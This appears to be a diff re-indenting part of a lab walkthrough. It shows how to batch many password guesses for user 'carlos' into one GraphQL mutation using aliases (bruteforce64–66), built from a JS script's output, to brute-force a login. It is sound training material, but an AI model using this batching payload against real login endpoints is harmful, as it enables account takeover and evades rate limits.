@@ -1771,87 +1771,87 @@ so it require the **``id``**
   <img width="1314" height="725" alt="image" src="https://github.com/user-attachments/assets/fa809ec6-fc31-4f69-ab17-59c287b0afbd" />
   
 
------
-
-### change it form this :
-
-<img width="1439" height="783" alt="image" src="https://github.com/user-attachments/assets/5299c3b2-8225-4368-9faa-e31770bd3fdb" />
-
-```graphql
-mutation login($input: LoginInput!) {
-        login(input: $input) {
-            token
-            success
-        }
-    }
-```
-
-### to this
-
-
-
-```graphql
-mutation  {
-        
-    }
-```
-
-### and inside it put the output of the js script
-
-
-```json
-
-bruteforce64:login(input:{password: "555555", username: "carlos"}) {
-        token
-        success
-    }
-
-
-bruteforce65:login(input:{password: "11111111", username: "carlos"}) {
-        token
-        success
-    }
-
-
-bruteforce66:login(input:{password: "131313", username: "carlos"}) {
-        token
-        success
-    }
-
-
-
-```
-
-
-### result 
-
-
-```
-mutation login{
-
-bruteforce64:login(input:{password: "555555", username: "carlos"}) {
-        token
-        success
-    }
-
-
-bruteforce65:login(input:{password: "11111111", username: "carlos"}) {
-        token
-        success
-    }
-
-
-bruteforce66:login(input:{password: "131313", username: "carlos"}) {
-        token
-        success
-    }
-
-
-
-}
-```
-
-
+  -----
+  
+  ### change it form this :
+  
+  <img width="1439" height="783" alt="image" src="https://github.com/user-attachments/assets/5299c3b2-8225-4368-9faa-e31770bd3fdb" />
+  
+  ```graphql
+  mutation login($input: LoginInput!) {
+          login(input: $input) {
+              token
+              success
+          }
+      }
+  ```
+  
+  ### to this
+  
+  
+  
+  ```graphql
+  mutation  {
+          
+      }
+  ```
+  
+  ### and inside it put the output of the js script
+  
+  
+  ```json
+  
+  bruteforce64:login(input:{password: "555555", username: "carlos"}) {
+          token
+          success
+      }
+  
+  
+  bruteforce65:login(input:{password: "11111111", username: "carlos"}) {
+          token
+          success
+      }
+  
+  
+  bruteforce66:login(input:{password: "131313", username: "carlos"}) {
+          token
+          success
+      }
+  
+  
+  
+  ```
+  
+  
+  ### result 
+  
+  
+  ```
+  mutation login{
+  
+  bruteforce64:login(input:{password: "555555", username: "carlos"}) {
+          token
+          success
+      }
+  
+  
+  bruteforce65:login(input:{password: "11111111", username: "carlos"}) {
+          token
+          success
+      }
+  
+  
+  bruteforce66:login(input:{password: "131313", username: "carlos"}) {
+          token
+          success
+      }
+  
+  
+  
+  }
+  ```
+  
+  
 
 
   </details>
